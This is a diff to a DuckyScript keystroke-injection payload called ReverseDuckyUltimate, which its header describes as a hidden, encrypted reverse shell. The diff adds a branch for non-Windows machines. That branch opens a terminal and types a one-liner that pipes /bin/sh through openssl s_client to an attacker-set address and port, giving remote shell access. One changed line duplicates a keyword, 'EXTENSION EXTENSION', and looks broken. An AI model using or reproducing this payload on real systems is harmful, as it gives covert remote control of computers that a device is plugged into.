@@ -1,12 +1,12 @@
 REM       ReverseDuckyUltimate
-REM       Version 1.0
-REM       OS: Windows / Unix for setup
+REM       Version 1.1
+REM       OS: Windows / Unix
 REM       Author: 0iphor13
 REM       Requirement: DuckyScript 3.0, PayloadStudio v.1.3 minimum
 REM       Morphing, Encrypted Reverse shell executed hidden in the background with custom identifier, the CAPSLOCK light at the end will indicate that the payload was executed.
 
 REM Extension PASSIVE_WINDOWS_DETECT by Korben for best and fastest deployment with guard rails
-EXTENSION PASSIVE_WINDOWS_DETECT
+EXTENSION EXTENSION PASSIVE_WINDOWS_DETECT
     REM VERSION 1.1
     REM AUTHOR: Korben
 
@@ -341,6 +341,17 @@ ELSE_DEFINED
         DELAY 20
         CAPSLOCK
     ELSE
-        ATTACKMODE OFF
+        REM Executing reverse shell when inserted into non-windows box
+        REM Non-ideal solution for opening terminal (But should work for most unix distros)
+        DELAY 2000
+        INJECT_MOD COMMAND
+        DELAY 2000
+        STRING terminal
+        DELAY 500
+        ENTER
+        DELAY 1000
+        STRINGLN which screen >/dev/null && which openssl >/dev/null && screen -md sh -c 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect #ADDRESS:#PORT > /tmp/s; rm /tmp/s'
+        DELAY 1000
+        STRINGLN exit
     END_IF
 END_IF_DEFINED
